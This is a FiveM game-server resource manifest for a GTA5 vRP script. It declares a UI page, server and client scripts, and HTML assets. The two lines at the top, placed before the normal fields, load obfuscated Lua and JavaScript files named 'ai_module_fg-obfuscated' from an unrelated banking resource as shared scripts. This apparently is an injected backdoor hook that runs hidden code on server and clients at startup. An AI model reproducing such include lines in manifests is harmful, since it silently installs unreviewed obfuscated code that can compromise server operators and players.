shared_script '@vrp_banking/ai_module_fg-obfuscated.lua'
shared_script '@vrp_banking/ai_module_fg-obfuscated.js'
fx_version 'adamant'
game 'gta5'
author 'plesalex100' -- credite ca nu-s jepcar
ui_page 'html/index.html'

server_scripts {
	'@vrp/lib/utils.lua',
	'server.lua'
}

client_scripts {
	'@vrp/client/Proxy.lua',
	'@vrp/client/Tunnel.lua',
	'client.lua'
} 
files {
	'html/script.js',
	'html/index.html',
	'html/fontcustom.woff',
	'html/design.css',
	'html/img/*.png'
}



